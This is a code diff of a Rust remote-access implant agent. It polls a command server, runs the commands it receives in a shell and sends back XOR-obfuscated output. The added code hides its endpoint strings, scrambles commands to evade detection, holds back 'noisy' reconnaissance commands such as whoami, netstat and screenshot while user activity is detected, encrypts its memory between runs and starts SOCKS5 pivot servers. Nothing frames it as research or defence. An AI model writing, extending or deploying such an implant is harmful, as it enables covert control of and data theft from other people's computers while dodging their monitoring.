@@ -1,27 +1,34 @@
-use std::io;
-use std::process::Command;
-use std::path::Path;
-use serde_json::json;
-use hostname;
-use os_info;
-use std::env;
-use get_if_addrs::get_if_addrs;
-use tokio::time::timeout;
-use std::time::{Duration}; // commented out SystemTime, UNIX_EPOCH
-use reqwest::StatusCode;
-use crate::networking::egress::get_egress_ip;
+use crate::commands::obfuscated::{obfuscate_command, random_case, random_quote_insertion, random_char_insertion, xor_obfuscate};
 use crate::config::AgentConfig;
-use log::{info, error};
-use std::collections::HashMap;
-use tokio::task::JoinHandle;
-use once_cell::sync::Lazy;
-use tokio::sync::Mutex as TokioMutex;
-use crate::networking::socks5_pivot_server::Socks5PivotServer;
+use crate::networking::egress::get_egress_ip;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
-use tokio::sync::mpsc;
+use crate::networking::socks5_pivot_server::Socks5PivotServer;
+use crate::opsec::{OPSEC_STATE, AgentMode, determine_agent_mode};
+use crate::util::random_jitter;
+use get_if_addrs::get_if_addrs;
+use hostname;
+use log::{info, error, debug};
+use once_cell::sync::Lazy;
+use os_info;
+use reqwest::StatusCode;
+use serde_json::json;
+use std::collections::HashMap;
+use std::env;
+use std::io;
+use std::path::Path;
+use std::process::Command;
 use std::sync::Arc;
+use std::sync::Mutex;
+use std::time::{Duration};
+use tokio::sync::Mutex as TokioMutex;
+use tokio::sync::mpsc;
+use tokio::task::JoinHandle;
+use tokio::time::timeout;
+use obfstr::obfstr;
 
 static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
+static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));
+
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -31,12 +38,14 @@ fn create_command(command: &str, args: &[&str]) -> Command {
     cmd
 }
 
+
 #[cfg(not(windows))]
 fn create_command(command: &str, args: &[&str]) -> Command {
     let mut cmd = Command::new(command);
     cmd.args(args);
     cmd
 }
+
 
 fn get_all_local_ips() -> Vec<String> {
     let mut ips = Vec::new();
@@ -59,6 +68,8 @@ fn get_all_local_ips() -> Vec<String> {
     ips
 }
 
+
+
 async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
     if cmd_parts.is_empty() {
         return Ok(String::new());
@@ -78,6 +89,12 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
         return Ok(format!("Current directory: {}", env::current_dir()?.display()));
     }
 
+    // PATCH: Decrypt sensitive state before command execution
+    {
+        let mut protector = crate::state::MEMORY_PROTECTOR.lock().unwrap();
+        protector.unprotect();
+    }
+
     // Handle other commands with timeout
     let result = timeout(Duration::from_secs(30), async {
         let output = if cfg!(windows) {
@@ -92,6 +109,12 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
             String::from_utf8_lossy(&output.stderr)))
     }).await;
 
+    // PATCH: Re-encrypt sensitive state immediately after command execution
+    {
+        let mut protector = crate::state::MEMORY_PROTECTOR.lock().unwrap();
+        protector.protect();
+    }
+
     match result {
         Ok(Ok(output)) => Ok(output),
         Ok(Err(e)) => Err(e),
@@ -99,8 +122,9 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
     }
 }
 
+// Send heartbeat to the server
 async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
-    let url = format!("{}/api/agent/{}/heartbeat", server_addr, agent_id);
+    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/heartbeat").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
     let client = config.build_http_client()?;
     
@@ -139,8 +163,9 @@ async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, age
     Ok(())
 }
 
+// Fetch command from the server
 async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
-    let url = format!("{}/api/agent/{}/command", server_addr, agent_id);
+    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/command").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
     let client = config.build_http_client()?;
     let response = client.get(&url)
@@ -172,13 +197,21 @@ async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_
     Ok(Some(cmd_resp.command))
 }
 
-async fn submit_result_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
-    let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
+// Submit result to the server
+async fn submit_result_with_client(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+    command: &str,
+    output: &str
+) -> io::Result<()> {
+    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/result").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
     let client = config.build_http_client()?;
+    let obfuscated_output = xor_obfuscate(output, agent_id);
     let data = json!({
         "command": command,
-        "output": output
+        "output": obfuscated_output
     });
 
     let response = client.post(&url)
@@ -199,41 +232,101 @@ async fn submit_result_with_client(config: &AgentConfig, server_addr: &str, agen
     Ok(())
 }
 
-pub async fn run_shell(
+fn is_weak_command(cmd: &str) -> bool {
+    let quiet = [
+        obfstr!("ping").to_string(),
+        obfstr!("echo").to_string(),
+    ];
+    quiet.iter().any(|q| cmd.starts_with(q))
+}
+
+fn is_strong_command(cmd: &str) -> bool {
+    let noisy = [
+        obfstr!("screenshot").to_string(),
+        obfstr!("scan").to_string(),
+        obfstr!("upload").to_string(),
+        obfstr!("download").to_string(),
+        obfstr!("ls").to_string(),
+        obfstr!("ps").to_string(),
+        obfstr!("netstat").to_string(),
+        obfstr!("ifconfig").to_string(),
+        obfstr!("whoami").to_string(),
+        obfstr!("uname").to_string(),
+        obfstr!("cat").to_string(),
+    ];
+    noisy.iter().any(|n| cmd.starts_with(n))
+}
+
+// Check if the command should be executed based on the current opsec mode
+async fn should_execute_command(cmd: &str) -> bool {
+    let mode = OPSEC_STATE.lock().unwrap().mode;
+    debug!("[OPSEC] should_execute_command: mode={:?}, cmd={}", mode, cmd);
+    match mode {
+        AgentMode::FullOpsec => {
+            if is_weak_command(cmd) {
+                debug!("[OPSEC] FullOpsec: Quiet command allowed: {}", cmd);
+                true
+            } else {
+                debug!("[OPSEC] FullOpsec: Queuing command: {}", cmd);
+                QUEUED_COMMANDS.lock().unwrap().push(cmd.to_string());
+                false
+            }
+        }
+        AgentMode::BackgroundOpsec => true,
+    }
+}
+
+// Main function to run the shell
+pub async fn agent_loop(
     server_addr: &str,
     agent_id: &str,
     pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
     pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
-    ) -> io::Result<()> {
-        let config = AgentConfig::load()?;
-        info!("[SHELL] Starting shell with agent ID: {}", agent_id);
-        send_heartbeat_with_client(&config, server_addr, agent_id).await?;
-        
-        loop {
-            info!("[SHELL] Polling for commands...");
-            match get_command_with_client(&config, server_addr, agent_id).await? {
-                Some(command) => {
-                    info!("[SHELL] Received command: {}", command);
+) -> Result<(), Box<dyn std::error::Error>> {
+    let config = AgentConfig::load()?;
+    info!("[SHELL] Starting shell with agent ID: {}", agent_id);
+    send_heartbeat_with_client(&config, server_addr, agent_id).await?;
 
-                    if command.starts_with("pivot_start ") {
-                        if let Ok(port) = command["pivot_start ".len()..].trim().parse::<u16>() {
-                            // You need to get pivot_handler and pivot_tx here (see step 4)
-                            let msg = start_pivot_server(port, pivot_handler.clone(), pivot_tx.clone()).await
-                                .unwrap_or_else(|e| e);
-                            let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
-                            continue;
-                        }
+    loop {
+        let mode = determine_agent_mode(&config);
+        let (base, jitter) = match mode {
+            AgentMode::FullOpsec => (2, 2),
+            AgentMode::BackgroundOpsec => (1, 1),
+        };
+        let sleep_time = random_jitter(base, jitter);
+
+        info!("[SHELL] Polling for commands...");
+        match get_command_with_client(&config, server_addr, agent_id).await? {
+            Some(command) => {
+                info!("[SHELL] Received command: {}", command);
+
+                if command.starts_with("pivot_start ") {
+                    if let Ok(port) = command["pivot_start ".len()..].trim().parse::<u16>() {
+                        let msg = start_pivot_server(port, pivot_handler.clone(), pivot_tx.clone()).await
+                            .unwrap_or_else(|e| e);
+                        let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
+                        continue;
                     }
-                    if command.starts_with("pivot_stop ") {
-                        if let Ok(port) = command["pivot_stop ".len()..].trim().parse::<u16>() {
-                            let msg = stop_pivot_server(port).await.unwrap_or_else(|e| e);
-                            let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
-                            continue;
-                        }
-                    }                
-                    
-                    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
-                    
+                }
+                if command.starts_with("pivot_stop ") {
+                    if let Ok(port) = command["pivot_stop ".len()..].trim().parse::<u16>() {
+                        let msg = stop_pivot_server(port).await.unwrap_or_else(|e| e);
+                        let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
+                        continue;
+                    }
+                }
+
+                // Re-check OPSEC before execution
+                if should_execute_command(&command).await {
+                    let mut obf_cmd = command.clone();
+                    obf_cmd = random_case(&obf_cmd, 0.5);
+                    obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
+                    obf_cmd = random_char_insertion(&obf_cmd, 0.2);
+                    obf_cmd = obfuscate_command(&obf_cmd);
+
+                    let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
+                    debug!("[OPSEC] Executing command: {}", command);
+
                     match execute_command(&cmd_parts).await {
                         Ok(output) => {
                             if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
@@ -250,14 +343,39 @@ pub async fn run_shell(
                             error!("[SHELL] Shell error: {}. Retrying...", e);
                         }
                     }
+                } else {
+                    debug!("[OPSEC] Command queued for later execution: {}", command);
+                    continue;
                 }
-                None => {
-                    tokio::time::sleep(Duration::from_secs(2)).await;
+            }
+            None => {
+                debug!("[SHELL] No command received, sleeping for {} seconds", sleep_time);
+                tokio::time::sleep(Duration::from_secs(sleep_time)).await;
+            }
+        }
+
+        // In BackgroundOpsec, drain and execute queued commands
+        if let AgentMode::BackgroundOpsec = determine_agent_mode(&config) {
+            let mut queue = QUEUED_COMMANDS.lock().unwrap();
+            for cmd in queue.drain(..) {
+                debug!("[OPSEC] BackgroundOpsec: Executing queued command: {}", cmd);
+                let cmd_parts: Vec<&str> = cmd.split_whitespace().collect();
+                if let Ok(output) = execute_command(&cmd_parts).await {
+                    let _ = submit_result_with_client(&config, server_addr, agent_id, &cmd, &output).await;
                 }
             }
         }
+
+        // After all command handling and sleeping:
+        if crate::opsec::determine_agent_mode(&config) == crate::opsec::AgentMode::FullOpsec {
+            info!("[OPSEC] User activity or risk detected! Returning to FullOpsec.");
+            break Ok(()); // Exit agent_loop, main loop will re-encrypt and wait
+        }
+    }
 }
 
+// Start a pivot server on the specified port
+// This function is called when the command "pivot_start <port>" is received
 async fn start_pivot_server(
     port: u16,
     pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
@@ -276,6 +394,8 @@ async fn start_pivot_server(
     Ok(format!("Started pivot server on port {}", port))
 }
 
+// Stop a pivot server on the specified port
+// This function is called when the command "pivot_stop <port>" is received
 async fn stop_pivot_server(port: u16) -> Result<String, String> {
     let mut servers = PIVOT_SERVERS.lock().await;
     if let Some(handle) = servers.remove(&port) {
@@ -283,5 +403,45 @@ async fn stop_pivot_server(port: u16) -> Result<String, String> {
         Ok(format!("Stopped pivot server on port {}", port))
     } else {
         Err(format!("No pivot server running on port {}", port))
+    }
+}
+
+pub async fn handle_command(command: &str) {
+    let mode = OPSEC_STATE.lock().unwrap().mode;
+    match mode {
+        AgentMode::FullOpsec => {
+            if is_strong_command(command) {
+                debug!("[OPSEC] FullOpsec: Queuing noisy command: {}", command);
+                QUEUED_COMMANDS.lock().unwrap().push(command.to_string());
+                return;
+            }
+            // Execute quiet command immediately
+            let mut obf_cmd = command.to_string();
+            obf_cmd = random_case(&obf_cmd, 0.5);
+            obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
+            obf_cmd = random_char_insertion(&obf_cmd, 0.2);
+            obf_cmd = obfuscate_command(&obf_cmd);
+
+            let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
+            execute_command(&cmd_parts).await;
+        }
+        AgentMode::BackgroundOpsec => {
+            // Execute immediately
+            let mut obf_cmd = command.to_string();
+            obf_cmd = random_case(&obf_cmd, 0.5);
+            obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
+            obf_cmd = random_char_insertion(&obf_cmd, 0.2);
+            obf_cmd = obfuscate_command(&obf_cmd);
+
+            let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
+            execute_command(&cmd_parts).await;
+            // Drain and execute queued commands
+            let mut queue = QUEUED_COMMANDS.lock().unwrap();
+            for cmd in queue.drain(..) {
+                debug!("[OPSEC] BackgroundOpsec: Executing queued command: {}", cmd);
+                let cmd_parts: Vec<&str> = cmd.split_whitespace().collect();
+                execute_command(&cmd_parts).await;
+            }
+        }
     }
 }
